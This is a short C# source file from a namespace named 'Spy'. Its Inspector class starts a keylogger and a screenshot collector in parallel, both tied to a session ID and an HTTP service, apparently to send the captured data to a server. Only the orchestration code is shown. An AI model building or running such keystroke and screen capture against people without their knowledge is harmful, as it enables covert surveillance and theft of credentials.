namespace HIT.Desktop.Spy
{
    using System.Collections.Generic;
    using System.Threading.Tasks;
    using Services;

    // TODO: Make it a singleton
    public class Inspector
    {
        private readonly string SessionId;
        private readonly InspectorSettings Settings;
        private readonly IList<IDataCollector> DataCollectors;
        private readonly IHttpService HttpService;

        public Inspector(string sessionId, InspectorSettings settings, IHttpService httpService)
        {
            this.Settings = settings;
            this.SessionId = sessionId;
            this.HttpService = httpService;
            this.DataCollectors = new List<IDataCollector>();
        }

        public void Start()
        {
            var keylogger = new Keylogger(this.SessionId, 
                this.Settings.KeyloggerSettings, 
                this.HttpService);

            var snapshooter = new Snapshooter(this.SessionId, 
                this.Settings.SnapshooterSettings, 
                this.HttpService);

            this.DataCollectors.Add(keylogger);
            this.DataCollectors.Add(snapshooter);

            var keyloggerTask = Task.Run(() => keylogger.Start());
            var snapshooterTask = Task.Run(() => snapshooter.Start());

            Task.WaitAll(keyloggerTask, snapshooterTask);
        }
    }
}
